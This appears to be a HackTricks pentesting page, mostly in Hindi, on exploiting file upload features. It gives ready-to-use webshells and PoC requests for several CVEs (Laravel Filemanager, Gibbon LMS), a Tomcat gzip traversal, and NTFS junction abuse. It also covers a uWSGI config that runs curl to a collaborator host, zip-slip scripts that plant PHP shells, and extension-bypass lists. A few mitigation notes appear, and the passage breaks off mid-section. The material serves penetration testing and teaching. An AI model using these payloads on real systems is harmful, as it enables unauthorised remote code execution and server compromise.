# फ़ाइल अपलोड

{{#include ../../banners/hacktricks-training.md}}

## फ़ाइल अपलोड सामान्य कार्यप्रणाली

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### फ़ाइल एक्सटेंशन चेक बाईपास करना

1. यदि लागू हों, तो पहले बताए गए extensions की जांच करें। इन्हें कुछ uppercase letters के साथ भी टेस्ट करें: _pHp, .pHP5, .PhAr ..._
2. _Check **adding a valid extension before** the execution extension (use previous extensions also):_
- _file.png.php_
- _file.png.Php5_
3. अंत में विशेष characters जोड़ने की कोशिश करें। आप सभी ascii और Unicode characters को bruteforce करने के लिए Burp का उपयोग कर सकते हैं। (_Note that you can also try to use the **previously** motioned **extensions**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. सुरक्षा को bypass करने के लिए सर्वर-साइड के **extension parser** को धोखा देने की कोशिश करें, जैसे **doubling** the **extension** या extensions के बीच junk data (**null** bytes) डालना। _You can also use the **previous extensions** to prepare a better payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. पिछले चेक में **एक और लेयर एक्सटेंशन्स** जोड़ने की कोशिश करें:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. कोशिश करें कि **exec extension वैध extension से पहले** रखें और उम्मीद करें कि सर्वर misconfigured हो। (useful to exploit Apache misconfigurations where anything with extension** _**.php**_**, but** not necessarily ending in .php** will execute code):
- _ex: file.php.png_
7. Windows में **NTFS alternate data stream (ADS)** का उपयोग करें। इस केस में, एक colon character ":" forbidden extension के बाद और permitted extension के पहले डाल दिया जाएगा। नतीज़तन, सर्वर पर एक **empty file with the forbidden extension** बन जाएगी (उदाहरण: "file.asax:.jpg”). इस फाइल को बाद में इसके short filename जैसी दूसरी तकनीकों से एडिट किया जा सकता है। The "**::$data**” pattern का उपयोग non-empty files बनाने के लिए भी किया जा सकता है। इसलिए, इस pattern के बाद एक dot character जोड़ना आगे की प्रतिबंधों को बाईपास करने में उपयोगी हो सकता है (जैसे "file.asp::$data.”)
8. फ़ाइलनाम की सीमाओं को तोड़ने की कोशिश करें। वैध extension कट जाता है और malicious PHP रह जाता है. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Some upload handlers trim or normalize trailing dot characters from the saved filename. In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) versions before 2.9.1, you can bypass extension validation by:

- Using a valid image MIME and magic header (e.g., PNG’s `\x89PNG\r\n\x1a\n`).
- Naming the uploaded file with a PHP extension followed by a dot, e.g., `shell.php.`.
- The server strips the trailing dot and persists `shell.php`, which will execute if it’s placed in a web-served directory (default public storage like `/storage/files/`).

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
फिर सहेजे गए पथ को हिट करें (typical in Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
### Bypass Content-Type, Magic Number, Compression & Resizing

- बायपास करने के लिए **Content-Type** चेक्स, **Content-Type** **header** के **value** को सेट करें: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- **magic number** चेक को बायपास करने के लिए फ़ाइल की शुरुआत में असली इमेज के **bytes** जोड़ें ( _file_ कमांड को confuse करें)। या शेल को **metadata** के अंदर डालें:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` या आप payload को सीधे इमेज में भी डाल सकते हैं:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- यदि आपकी इमेज पर **compressions** लागू किया जा रहा है, उदाहरण के लिए कुछ standard PHP libraries जैसे [PHP-GD](https://www.php.net/manual/fr/book.image.php) का उपयोग करके, तो पहले वाली techniques काम नहीं करेंगी। हालांकि, आप **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) का उपयोग कर सकते हैं ताकि कुछ टेक्स्ट insert किया जा सके जो **survive compression** कर सके।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- वेब पेज इमेज को **resizing** भी कर सकता है, उदाहरण के लिए PHP-GD फंक्शन्स `imagecopyresized` या `imagecopyresampled` का उपयोग करके। हालांकि, आप **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) का उपयोग कर सकते हैं ताकि कुछ टेक्स्ट insert किया जा सके जो **survive compression** कर सके।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- एक और तकनीक जो एक payload बनाती है जो इमेज के resizing को **survive** कर सके, PHP-GD फंक्शन `thumbnailImage` का उपयोग करती है। हालांकि, आप **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) का उपयोग कर सकते हैं ताकि कुछ टेक्स्ट insert किया जा सके जो **survive compression** कर सके।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- पहले से uploaded फ़ाइल का नाम बदलने (extension बदलने) के लिए किसी vulnerability को ढूँढें।
- **Local File Inclusion** vulnerability ढूँढें ताकि backdoor execute हो सके।
- **Possible Information disclosure**:
1. एक ही फ़ाइल को **कई बार** (और एक ही समय पर) **उसी नाम** के साथ upload करें
2. किसी फ़ाइल या फ़ोल्डर के **नाम** के साथ फ़ाइल upload करें जो पहले से **मौजूद** हो
3. फ़ाइल का नाम **"." , "..", or "…"** रखें और उसे upload करें। उदाहरण के लिए, Apache में **Windows** पर, अगर application uploaded files को "/www/uploads/" डायरेक्टरी में सेव करता है, तो "." filename "/www/" डायरेक्टरी में "uploads” नाम की फाइल बना देगा।
4. ऐसी फ़ाइल upload करें जो आसानी से delete न हो सके, जैसे **"…:.jpg"** in **NTFS**। (Windows)
5. **Windows** में ऐसी फ़ाइल upload करें जिसमें नाम में `|<>*?”` जैसे **invalid characters** हों। (Windows)
6. **Windows** में **reserved** (**forbidden**) **names** का उपयोग करके फ़ाइल upload करें जैसे CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- यह भी कोशिश करें कि एक executable (.exe) या एक **.html** (कम suspicious) upload करें जो victim द्वारा गलती से खोले जाने पर **code execute** कर दे।

### Special extension tricks

यदि आप फ़ाइलें **PHP server** पर upload करने की कोशिश कर रहे हैं, तो [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
यदि आप फ़ाइलें **ASP server** पर upload करने की कोशिश कर रहे हैं, तो [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` फाइलें `.jar` की तरह हैं Java के लिए, पर PHP के लिए, और इन्हें **php file की तरह use** किया जा सकता है (php से execute करना, या किसी स्क्रिप्ट में include करना...)

`.inc` extension कभी-कभी php फाइलों के लिए उपयोग होती है जो केवल **import files** के लिए होती हैं, इसलिए किसी बिंदु पर किसी ने इस extension को execute होने की अनुमति दे दी हो सकती है।

## **Jetty RCE**

यदि आप Jetty server में एक XML फ़ाइल upload कर सकें तो आप [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)** प्राप्त कर सकते हैं।** तो, जैसा कि निम्नलिखित इमेज में बताया गया है, XML फ़ाइल को `$JETTY_BASE/webapps/` में upload करें और shell की उम्मीद करें!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

इस vulnerability की विस्तृत जांच के लिए मूल रिसर्च देखें: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities का फायदा uWSGI servers में उठाया जा सकता है अगर किसी के पास `.ini` configuration file modify करने की क्षमता हो। uWSGI configuration files एक विशिष्ट syntax का उपयोग करते हैं जिसमें "magic" variables, placeholders, और operators शामिल किए जा सकते हैं। विशेष रूप से, '@' operator जिसे `@(filename)` के रूप में उपयोग किया जाता है, किसी फ़ाइल की सामग्री include करने के लिए डिज़ाइन किया गया है। uWSGI में समर्थित विभिन्न schemes में से, "exec" scheme विशेष रूप से शक्तिशाली है, जो किसी process के standard output से डेटा पढ़ने की अनुमति देता है। जब `.ini` configuration file process होती है तो इस फीचर का दुरुपयोग Remote Command Execution या Arbitrary File Write/Read जैसे घातक प्रयोजनों के लिए किया जा सकता है।

निम्नलिखित में एक हानिकारक `uwsgi.ini` फ़ाइल का उदाहरण देखें, जो विभिन्न schemes को दर्शाता है:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
The execution of the payload occurs during the parsing of the configuration file. For the configuration to be activated and parsed, the uWSGI process must either be restarted (potentially after a crash or due to a Denial of Service attack) or the file must be set to auto-reload. The auto-reload feature, if enabled, reloads the file at specified intervals upon detecting changes.

यह समझना महत्वपूर्ण है कि uWSGI की configuration file parsing काफी lax है। विशेष रूप से, चर्चा किए गए payload को एक binary file (जैसे कि एक image या PDF) में insert किया जा सकता है, जिससे संभावित exploitation का दायरा और बढ़ जाता है।

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Unauthenticated endpoint in Gibbon LMS allows arbitrary file write inside the web root, leading to pre-auth RCE by dropping a PHP file. Vulnerable versions: up to and including 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (सर्वर type/name को ignore करता है, tail को base64-decode करता है)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: कोई भी non-empty value स्वीकार किया जाता है (e.g., `0000000001`)

Minimal PoC to write and read back a file:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
एक न्यूनतम webshell डालें और कमांड्स निष्पादित करें:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
नोट्स:
- हैंडलर `;` और `,` से स्प्लिट करने के बाद `base64_decode($_POST["img"])` करता है, फिर बाइट्स को `$absolutePath . '/' . $_POST['path']` पर लिखता है बिना extension/type को वैलिडेट किए।
- परिणामस्वरूप कोड वेब सर्विस user के रूप में चलता है (उदा., XAMPP Apache on Windows).

References for this bug include the usd HeroLab advisory and the NVD entry. See the References section below.

## **wget File Upload/SSRF Trick**

कुछ मामलों में आप देख सकते हैं कि सर्वर **`wget`** का उपयोग करके **फ़ाइलें डाउनलोड** कर रहा है और आप **URL** निर्दिष्ट कर सकते हैं। ऐसे मामलों में, कोड यह जाँच कर सकता है कि डाउनलोड की गई फ़ाइलों का extension whitelist में है ताकि केवल अनुमत फ़ाइलें ही डाउनलोड हों। हालांकि, **इस चेक को बाईपास किया जा सकता है।**\
**linux** में एक **filename** की **maximum** लंबाई **255** है, हालांकि, **wget** फ़ाइलनामों को **236** characters तक truncate कर देता है। आप **download a file called "A"*232+".php"+".gif"** कर सकते हैं, यह फ़ाइलनाम **bypass** कर देगा **check** को (जैसा कि इस उदाहरण में **".gif"** एक **valid** extension है) लेकिन `wget` फ़ाइल का नाम बदलकर **"A"*232+".php"** कर देगा।
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

### NTFS junctions (Windows) के माध्यम से upload directory से बाहर निकलना

(For this attack you will need local access to the Windows machine) जब uploads Windows पर per-user subfolders के अंतर्गत सहेजे जाते हैं (e.g., C:\Windows\Tasks\Uploads\<id>\) और आप उस subfolder के creation/deletion को नियंत्रित करते हैं, तो आप उसे किसी sensitive location (e.g., the webroot) की ओर इशारा करने वाले directory junction से बदल सकते हैं। आगे के uploads target path में लिखे जाएँगे, जिससे code execution संभव हो सकता है अगर लक्ष्य server‑side code को interpret करता है।

Example flow to redirect uploads into XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
नोट्स
- mklink /J creates an NTFS directory junction (reparse point). वेब सर्वर का अकाउंट junction को फॉलो करना चाहिए और destination में write permission होना चाहिए।
- यह arbitrary file writes को redirect करता है; अगर destination scripts (PHP/ASP) execute करता है, तो यह RCE बन सकता है।
- Defenses: writable upload roots को attacker‑controllable होने की अनुमति न दें जैसे C:\Windows\Tasks के नीचे; junction creation को block करें; extensions को server‑side validate करें; uploads को अलग volume पर स्टोर करें या deny‑execute ACLs के साथ रखें।

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

कुछ upload/ingest handlers raw request body को ऐसे filesystem path पर लिखते हैं जो user-controlled query parameters से बनता है। अगर handler Content-Encoding: gzip को भी सपोर्ट करता है और destination path को canonicalize/validate करने में विफल रहता है, तो आप directory traversal को एक gzipped payload के साथ मिलाकर arbitrary bytes को किसी web-served directory में लिख सकते हैं और RCE हासिल कर सकते हैं (उदाहरण के लिए, Tomcat के webapps में एक JSP गिरा दें)।

Generic exploitation flow:
- अपने server-side payload (e.g., minimal JSP webshell) तैयार करें और bytes को gzip-compress करें।
- एक POST भेजें जहाँ एक path parameter (e.g., token) intended folder से बाहर निकलने वाला traversal रखता हो, और file उस filename को इंगित करता हो जिसे persist करना है। Content-Type: application/octet-stream और Content-Encoding: gzip सेट करें; body compressed payload होगा।
- लिखी गई फ़ाइल पर ब्राउज़ करके execution ट्रिगर करें।

Illustrative request:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
फिर ट्रिगर करें:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
नोट्स
- लक्षित पथ इंस्टॉल के अनुसार भिन्न होते हैं (उदा., /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ कुछ स्टैक्स में)। कोई भी वेब-एक्सपोज्ड फ़ोल्डर जो JSP चलाता है काम करेगा।
- Burp Suite’s Hackvertor extension आपके payload से सही gzip बॉडी पैदा कर सकता है।
- यह एक शुद्ध pre-auth arbitrary file write → RCE पैटर्न है; यह multipart parsing पर निर्भर नहीं करता।

निवारण
- Upload गंतव्य सर्वर-साइड पर निर्धारित करें; clients से आने वाले path fragments पर कभी भरोसा न करें।
- Canonicalize करें और यह सुनिश्चित करें कि resolved path किसी allow-listed base directory के भीतर ही रहे।
- Uploads को non-executable volume पर स्टोर करें और writable paths से script execution को deny करें।

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) एक पावरफुल टूल है जो Pentesters और Bug Hunters को file upload mechanisms का परीक्षण करने में मदद करने के लिए बनाया गया है। यह विभिन्न bug bounty तकनीकों का उपयोग करके vulnerabilities की पहचान और exploit करने की प्रक्रिया को सरल बनाता है, जिससे web applications का thorough आकलन सुनिश्चित होता है।

### Corrupting upload indices with snprintf quirks (historical)

कुछ legacy upload handlers जो `snprintf()` या समान का उपयोग करके single-file upload से multi-file arrays बनाते हैं, उनसे `_FILES` structure को forge करने के लिए trick किया जा सकता है। `snprintf()` व्यवहार में inconsistencies और truncation के कारण, सावधानीपूर्वक बनाया गया single upload सर्वर-साइड पर multiple indexed files के रूप में दिख सकता है, जिससे logic भ्रमित हो जाता है जो एक strict shape मानता है (उदा., इसे multi-file upload मानकर unsafe branches लेता है)। आज यह niche है, पर यह “index corruption” पैटर्न कभी-कभी CTFs और पुराने codebases में फिर उभरता है।

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- यदि आप वेब सर्वर को किसी URL से **image** पकड़ने के लिए निर्देश दे सकते हैं तो आप [SSRF](../ssrf-server-side-request-forgery/index.html) का दुरुपयोग आजमा सकते हैं। यदि यह **image** किसी **public** साइट पर **saved** होने वाली है, तो आप [https://iplogger.org/invisible/](https://iplogger.org/invisible/) जैसे URL का उपयोग करके हर visitor की जानकारी **steal** कर सकते हैं।
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- विशेष रूप से तैयार किए गए PDFs से XSS: निम्न पेज बताता है कि कैसे **inject PDF data to obtain JS execution** किया जा सकता है ([link](../xss-cross-site-scripting/pdf-injection.md)). यदि आप PDFs upload कर सकते हैं, तो आप ऐसा PDF तैयार कर सकते हैं जो दिए गए निर्देशों के अनुसार arbitrary JS execute करेगा।
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content को अपलोड करके जांचें कि सर्वर में कोई **antivirus** है या नहीं।
- फाइल अपलोड करते समय कोई **size limit** है या नहीं यह जांचें

यहाँ अपलोड करके आप जो हासिल कर सकते हैं उनकी टॉप 10 सूची (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

अन्य filetypes के लिए [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) देखें।

## Zip/Tar File Automatically decompressed Upload

यदि आप ऐसा ZIP अपलोड कर सकते हैं जो सर्वर के अंदर decompressed किया जाएगा, तो आप 2 चीजें कर सकते हैं:

### Symlink

अन्य फ़ाइलों के soft links वाले लिंक को अपलोड करें; फिर जब आप decompressed फ़ाइलों तक पहुंचेंगे तो आप linked फ़ाइलों तक पहुँच पाएँगे:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### अलग फ़ोल्डरों में डीकम्प्रेस करें

डीकम्प्रेशन के दौरान डायरेक्टरी में फ़ाइलों का अनपेक्षित निर्माण एक गंभीर समस्या है। शुरुआती धारणा यह हो सकती है कि यह सेटअप मैलिशियस फ़ाइल अपलोड के ज़रिए OS-level command execution से सुरक्षा करता है, लेकिन ZIP archive format का hierarchical compression support और directory traversal क्षमताओं का उपयोग किया जा सकता है। इससे हमलावर सीमाओं को बाईपास कर सकते हैं और टार्गेटेड एप्लिकेशन की decompression functionality को मैनीपुलेट करके secure upload directories से बाहर निकल सकते हैं।

ऐसे फ़ाइलें क्राफ्ट करने के लिए एक automated exploit [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc) पर उपलब्ध है। इस utility का उपयोग नीचे दिखाए तरीके से किया जा सकता है:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
इसके अतिरिक्त, **symlink trick with evilarc** एक विकल्प है। यदि लक्ष्य `/flag.txt` जैसी किसी फ़ाइल को निशाना बनाना है, तो उस फ़ाइल का symlink आपके सिस्टम में बनाया जाना चाहिए। यह सुनिश्चित करता है कि evilarc अपने संचालन के दौरान त्रुटियों का सामना न करे।

नीचे Python कोड का एक उदाहरण दिया गया है जो malicious zip file बनाने के लिए उपयोग किया जाता है:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**कम्प्रेशन का दुरुपयोग file spraying के लिए**

अधिक जानकारी के लिए **mल पोस्ट देखें**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP कोड लिखा जाता है जो `$_REQUEST` वेरिएबल से पास किए गए कमांड्स को चलाता है।

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: कई फाइलें बनाई जाती हैं और एक zip archive बनाया जाता है जिसमें ये फाइलें शामिल होती हैं।

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: zip के अंदर की फाइलों के नाम vi या hex editor का उपयोग करके बदले जाते हैं, 'xxA' को '../' से बदलकर directories traverse किया जाता है।

```bash
:set modifiable
:%s/xxA/../g
:x!
```

### ZIP NUL-byte filename smuggling (PHP ZipArchive confusion)

जब backend PHP’s ZipArchive का उपयोग करके ZIP entries को validate करता है लेकिन extraction filesystem पर raw names का उपयोग करके लिखता है, तो आप filename fields में एक NUL (0x00) डालकर disallowed extension smuggle कर सकते हैं। ZipArchive entry name को एक C‑string की तरह मानता है और पहले NUL पर truncate कर देता है; filesystem पूरा नाम लिखता है, NUL के बाद वाली सब कुछ छोड़ देता है।

High-level flow:
- एक वैध container file तैयार करें (उदा., एक valid PDF) जिसमें एक छोटी सी PHP stub को stream में embed किया गया हो ताकि magic/MIME PDF ही रहे।
